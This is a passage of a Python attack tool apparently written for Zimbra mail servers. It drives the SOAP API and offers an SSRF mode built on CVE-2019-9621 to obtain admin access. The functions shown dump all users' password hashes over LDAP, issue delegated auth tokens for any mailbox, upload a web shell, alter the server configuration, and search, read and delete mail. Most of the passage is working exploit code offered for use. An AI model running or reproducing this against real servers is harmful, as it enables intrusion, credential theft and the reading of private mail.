    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get memcached config")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        if "serverList" in r.text:
            pattern_config = re.compile(r"serverList=\"(.*?)\"")
            config = pattern_config.findall(r.text)[0]
            print("[+] ServerList: "+config)
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))       

def getallconfig_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <GetAllConfigRequest xmlns="urn:zimbraAdmin">
         </GetAllConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """
 
    try:
        print("[*] Try to getallconfig")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("getallconfig.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getallconfig.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallconfig_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <GetAllConfigRequest xmlns="urn:zimbraAdmin">
         </GetAllConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"
    try:
        print("[*] Try to getallconfig")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("getallconfig.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getallconfig.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def getservicestats_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServiceStatusRequest xmlns="urn:zimbraAdmin">
         </GetServiceStatusRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to GetServiceStatusRequest")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)       
        if "time" in r.text:
            pattern_server = re.compile(r"server=\"(.*?)\"")
            server = pattern_server.findall(r.text)[0]
            pattern_config = re.compile(r"t=\"(.*?)\"")
            config = pattern_config.findall(r.text)[0]            
            print("[+] Server: "+server)
            print("[+] Start time: "+str(datetime.fromtimestamp(int(config))))

        print("[*] Try to save the response")        
        with open("getservicestats.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getservicestats.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def getservicestats_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServiceStatusRequest xmlns="urn:zimbraAdmin">
         </GetServiceStatusRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to GetServiceStatusRequest")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)       
        if "time" in r.text:
            pattern_server = re.compile(r"server=\"(.*?)\"")
            server = pattern_server.findall(r.text)[0]
            pattern_config = re.compile(r"t=\"(.*?)\"")
            config = pattern_config.findall(r.text)[0]            
            print("[+] Server: "+server)
            print("[+] Start time: "+str(datetime.fromtimestamp(int(config))))

        print("[*] Try to save the response")        
        with open("getservicestats.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getservicestats.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def modifyconfig_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <ModifyConfigRequest xmlns="urn:zimbraAdmin">
          
          <a n="{name}">{value}</a>
         </ModifyConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :")
    name = input("[>]: ")

    print("[*] Input the value :")
    value = input("[>]: ")

    try:
        print("[*] Try to modifyconfig")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name,value=value),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def modifyconfig_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <ModifyConfigRequest xmlns="urn:zimbraAdmin">
          
          <a n="{name}">{value}</a>
         </ModifyConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :")
    name = input("[>]: ")

    print("[*] Input the value :")
    value = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to modifyconfig")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name,value=value),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def modifyserver_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <ModifyServerRequest xmlns="urn:zimbraAdmin">
          <id>{id}</id>  
          <a n="{name}">{value}</a>
         </ModifyServerRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the zimbraId:")
    id = input("[>]: ")

    print("[*] Input the name :")
    name = input("[>]: ")

    print("[*] Input the value :")
    value = input("[>]: ")

    try:
        print("[*] Try to modifyserver")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id,name=name,value=value),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("modifyserver.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as modifyserver.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def modifyserver_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>         
         <ModifyServerRequest xmlns="urn:zimbraAdmin">
          <id>{id}</id>  
          <a n="{name}">{value}</a>
         </ModifyServerRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the zimbraId:")
    id = input("[>]: ")

    print("[*] Input the name :")
    name = input("[>]: ")

    print("[*] Input the value :")
    value = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to modifyserver")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id,name=name,value=value),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("modifyserver.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as modifyserver.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def reloadmemcachedconfig_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <ReloadMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </ReloadMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to reload memcached config")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def reloadmemcachedconfig_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <ReloadMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </ReloadMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to reload memcached config")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getldapentries_request(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get LDAP Entries of %s"%(query))
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getldapentries_requestSSRF(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get LDAP Entries of %s"%(query))
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalluserhash(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get all users' hash")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        if 'userPassword' in r.text:
            pattern_data = re.compile(r"userPass(.*?)objectClass")
            data = pattern_data.findall(r.text)   
            for i in range(len(data)):
                pattern_user = re.compile(r"mail\">(.*?)<")
                user = pattern_user.findall(data[i])
                pattern_password = re.compile(r"word\">(.*?)<")  
                password = pattern_password.findall(data[i])  
                print("[+] User:%s"%(user[0]))  
                print("    Hash:%s"%(password[0]))
        else:
            print("[!]")
            print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))

def getalluserhashSSRF(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all users' hash")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        if 'userPassword' in r.text:
            pattern_data = re.compile(r"userPass(.*?)objectClass")
            data = pattern_data.findall(r.text)   
            for i in range(len(data)):
                pattern_user = re.compile(r"mail\">(.*?)<")
                user = pattern_user.findall(data[i])
                pattern_password = re.compile(r"word\">(.*?)<")  
                password = pattern_password.findall(data[i])  
                print("[+] User:%s"%(user[0]))  
                print("    Hash:%s"%(password[0]))
        else:
            print("[!]")
            print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))

def gettoken_request(uri,token):
    print("[*] Input the mailbox:")
    mail = input("[>]: ")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
            <account by="name">{mail}</account>        
         </DelegateAuthRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get the token")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
        if 'authToken' in r.text:
            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_token.findall(r.text)
            print("[+] authTOken:%s"%(token[0]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def gettoken_requestSSRF(uri,token):
    print("[*] Input the mailbox:")
    mail = input("[>]: ")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
            <account by="name">{mail}</account>        
         </DelegateAuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get the token")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
        if 'authToken' in r.text:
            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_token.findall(r.text)
            print("[+] authTOken:%s"%(token[0]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def uploadwebshell_request(uri,token):
    fileContent = 0;
    path = input("[*] Input the path of the file:")
    with open(path,'r') as f:
        fileContent = f.read()
    filename = path
    print("[*] filepath:"+path)
    print("[*] filedata:"+fileContent)

    headers["Content-Type"]="application/xml"  
    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"

    m = MultipartEncoder(fields={
    'clientFile':(filename,fileContent,"image/jpeg")
    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')

    r = requests.post(uri+"/service/extension/clientUploader/upload",headers=headers,data=m,verify=False)
    if 'window.parent._uploadManager.loaded(1,' in r.text:
        print("[+] Upload Success!")
        print("[+] URL:%s/downloads/%s"%(uri,filename))
    else:
        print("[!]")
        print(r.text)  

def uploadzimlet_request(uri,token):
    fileContent = 0;
    path = input("[*] Input the path of the file:")
    with open(path,'rb') as f:
        fileContent = f.read()
    filename = path
    print("[*] filepath:"+path)
    if "\\" in path:
        strlist = path.split('\\')
        filename = strlist[-1]
    if "/" in path:  
        strlist = path.split('/')
        filename = strlist[-1]    
    headers["Content-Type"]="application/xml"  
    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"

    m = MultipartEncoder(fields={
    'clientFile':(filename,fileContent,'application/zip')
    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')

    r = requests.post(uri+"/service/upload",headers=headers,data=m,verify=False)
    if "200" in r.text:
        print("[+] Success")
        pattern_id = re.compile(r"\',\'(.*?)\'")
        attachmentid = pattern_id.findall(r.text)[0]
        print("    name:"+filename) 
        print("    Id:%s"%(attachmentid))
        return attachmentid
    else:
        print("[!]")
        print(r.text)

def deletemail_request(uri,token):
    id = input("[*] Input the item id of the mail:")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <ConvActionRequest  xmlns="urn:zimbraMail">
            
            <action>
                <op>delete</op>
                <tcon>o</tcon>
                <id>{id}</id>           
            </action>
         </ConvActionRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to delete the mail")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        if "soap:Reason" not in r.text:
            print("[+] Success")
        else:
            print("[!]")
            print(r.text)    
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalladdresslists_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAddressListsRequest  xmlns="urn:zimbraAccount"> 
         </GetAllAddressListsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all address lists")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])

    except Exception as e:
        print("[!] Error:%s"%(e))

def getcontacts_request(uri,token,email):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetContactsRequest xmlns="urn:zimbraMail">
            <a n="email">{email}</a>
         </GetContactsRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get contacts")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,email=email),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])      
    except Exception as e:
        print("[!] Error:%s"%(e))

def getfolder_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetFolderRequest xmlns="urn:zimbraMail"> 
         </GetFolderRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get folder")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_size = re.compile(r" n=\"(.*?)\"")
        size = pattern_size.findall(r.text)      
        for i in range(len(name)):
            print("[+] Name:%s,Size:%s"%(name[i],size[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def getitem_request(uri,token,path):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetItemRequest xmlns="urn:zimbraMail"> 
            <item>
                <path>{path}</path>
            </item>
         </GetItemRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get item of %s"%(path))
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,path=path),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])
    except Exception as e:
        print("[!] Error:%s"%(e))

def getmsg_request(uri,token,id):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMsgRequest xmlns="urn:zimbraMail"> 
            <m>
                <id>{id}</id>
            </m>
         </GetMsgRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get msg")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def searchmail_request(uri,token):
    folder = input("[*] Input the folder(inbox/sent/trash):")
    size = input("[*] Input the size to serach:")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <SearchRequest  xmlns="urn:zimbraMail">
            <query>in:{folder}</query>
            <limit>{size}</limit>
         </SearchRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to search " + folder)
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,folder=folder,size=size),verify=False,timeout=15)        
        pattern_c = re.compile(r"<c (.*?)</c>")
        maildata = pattern_c.findall(r.text)
        print("[+] Total: " + str(len(maildata)))
        for i in range(len(maildata)):
            pattern_data = re.compile(r"id=\"(.*?)\"")
            data = pattern_data.findall(maildata[i])[0]
            print("[+] Item id: " + data)

            pattern_data = re.compile(r"a=\"(.*?)\"")
            data = pattern_data.findall(maildata[i])[0]
            print("    From: " + data)

            pattern_data = re.compile(r"<su>(.*?)</su>")
            data = pattern_data.findall(maildata[i])[0]
            print("    Subject: " + data)

            pattern_data = re.compile(r"<fr>(.*?)</fr>")
            data = pattern_data.findall(maildata[i])[0]
            print("    Body: " + data)

            pattern_data = re.compile(r"sf=\"(.*?)\"")
            data = pattern_data.findall(maildata[i])[0]
            data = str(datetime.fromtimestamp(int(data[:-3])))
            print("    UnixTime: " + data)      
    except Exception as e:
        print("[!] Error:%s"%(e))

def sendtestmailtoself_request(uri,token,mailbox):
    aid = input("[*] Input the id of the attachment:")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <SendMsgRequest xmlns="urn:zimbraMail">
            <noSave>1</noSave>
            <m>
                <e t="t" a="{mailbox}"/>
                <e t="f" a="{mailbox}"/>
                <su>subjecttest1</su>
                <mp>
                    <ct>"text/plain"</ct>
                    <content>bodytest123456</content>
                </mp>
                <attach>
                    <aid>{aid}</aid>           
                </attach>
            </m>
         </SendMsgRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to send msg")
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(token=token,aid=aid,mailbox=mailbox),verify=False,timeout=15)
        if "soap:Reason" not in r.text:
            print("[+] Success")
        else:
            print("[!]")
            print(r.text)        
        
    except Exception as e:
        print("[!] Error:%s"%(e))

def uploadattachment_request(uri,token):
    fileContent = 0;
    path = input("[*] Input the path of the file:")
    with open(path,'rb') as f:
        fileContent = f.read()
    filename = path
    print("[*] filepath:"+path)
    if "\\" in path:
        strlist = path.split('\\')
        filename = strlist[-1]
    if "/" in path:  
        strlist = path.split('/')
        filename = strlist[-1]

    headers["Content-Type"]="text/plain"
    headers["Content-Disposition"]="attachment; filename=\""+filename+"\""
    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"
    files = {filename: fileContent}
    r = requests.post(uri+"/service/upload?fmt=raw,extended",headers=headers,files=files,verify=False)
    if "200" in r.text:
        print("[+] Success")
        pattern_id = re.compile(r"aid\":\"(.*?)\"")
        attachmentid = pattern_id.findall(r.text)[0]
        pattern_type = re.compile(r"ct\":\"(.*?)\"")
        attachmenttype = pattern_type.findall(r.text)[0]
        print("    name:"+filename)
        print("    Type:%s"%(attachmenttype))
        print("    Id:%s"%(attachmentid))
        return attachmentid
    else:
        print("[!]")
        print(r.text)

def uploadattachmentraw_request(uri,token):
    fileContent = 0;
    path = input("[*] Input the path of the file:")
    with open(path,'rb') as f:
        fileContent = f.read()
    filename = path
    print("[*] filepath:"+path)
    if "\\" in path:
        strlist = path.split('\\')
        filename = strlist[-1]
    if "/" in path:  
        strlist = path.split('/')
        filename = strlist[-1]

    headers["Content-Type"]="application/xml"  
    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"
    m = MultipartEncoder(fields={
    'clientFile':(filename,fileContent,"text/plain")
    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')
    r = requests.post(uri+"/service/upload?fmt=raw,extended",headers=headers,data=m,verify=False)
    if "200" in r.text:
        print("[+] Success")
        pattern_id = re.compile(r"aid\":\"(.*?)\"")
        attachmentid = pattern_id.findall(r.text)[0]
        pattern_type = re.compile(r"ct\":\"(.*?)\"")
        attachmenttype = pattern_type.findall(r.text)[0]
        print("    name:"+filename)
        print("    Type:%s"%(attachmenttype))
        print("    Id:%s"%(attachmentid))
        return attachmentid
    else:
        print("[!]")
        print(r.text)

def viewmail_request(uri,token):
    id = input("[*] Input the item id of the mail:")
    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"
    r = requests.get(uri+"/service/home/~/?auth=co&view=text&id="+id,headers=headers,verify=False)
    if r.status_code == 200:        
        print("[*] Try to save the details of the mail")
        path = id + ".txt"        
        with open(path, 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[+] Save as " + path)
    else:
        print("[!]")
        print(r.status_code)
        print(r.text)


def usage_low():
    print("    Support command:")
    print("      DeleteMail")
    print("      GetAllAddressLists")
    print("      GetContacts")
    print("      GetItem <path>,Eg:GetItem /Inbox")
    print("      GetMsg <MessageID>,Eg:GetMsg 259")
    print("      listallfoldersize")
    print("      SearchMail")
    print("      SendTestMailToSelf")
    print("      uploadattachment")
    print("      uploadattachmentraw")
    print("      viewmail")
    print("      help")
    print("      exit")

def usage_admin():
    print("Support command:")
    print("      CreateAccount")
    print("      DeleteAccount")
    print("      DeployZimlet")
    print("      UndeployZimlet")      
    print("      DeleteZimlet")
    print("      GetAllZimlet")
    print("      GetAccount")      
    print("      GetAllDomains")      
    print("      GetAllMailboxes")
    print("      GetAllAccounts")
    print("      GetAllAdminAccounts")
    print("      GetAllConfig")
    print("      GetMemcachedClientConfig")
    print("      GetLDAPEntries")
    print("      GetServer")
    print("      GetServerNIfs")
    print("      GetServiceStatus")
    print("      GetToken")      
    print("      getalluserhash")
    print("      ModifyConfig")
    print("      ModifyServer")
    print("      ReloadMemcachedClientConfig")
    print("      uploadwebshell")
    print("      uploadzimlet")
    print("      help")
    print("      exit")

def usage_ssrf():
    print("Support command:")
    print("      CreateAccountSSRF")
    print("      DeleteAccountSSRF")
    print("      DeployZimletSSRF")
    print("      UndeployZimletSSRF")
    print("      DeleteZimletSSRF")
    print("      GetAllZimletSSRF")
    print("      GetAccountSSRF")
    print("      GetAllDomainsSSRF")
    print("      GetAllMailboxesSSRF")
    print("      GetAllAccountsSSRF")
    print("      GetAllAdminAccountsSSRF")
    print("      GetAllConfigSSRF")
    print("      GetMemcachedClientConfigSSRF")
    print("      GetLDAPEntriesSSRF")
    print("      GetServerSSRF")
    print("      GetServerNIfsSSRF")
    print("      GetServiceStatusSSRF")
    print("      GetTokenSSRF")      
    print("      getalluserhashSSRF")
    print("      ModifyConfigSSRF")
    print("      ModifyServerSSRF")
    print("      ReloadMemcachedClientConfigSSRF")
    print("      uploadwebshell")
    print("      uploadzimlet")    
    print("      help")
    print("      exit")

if __name__ == '__main__':
    if len(sys.argv)!=5:
        print("\nUse Zimbra SOAP API to connect the Zimbra mail server.")
        print("Author:3gstudent")   
        print("Usage:")
        print("      %s <url> <username> <password> <mode>"%(sys.argv[0]))
        print("mode:")
        print("      low       auth for low token")   
        print("      admin     auth for admin token")
        print("      ssrf      Use CVE-2019-9621 to get the admin token")
        print("Eg:")
        print("      %s https://192.168.1.1 user1@mail.zimbra password low"%(sys.argv[0]))
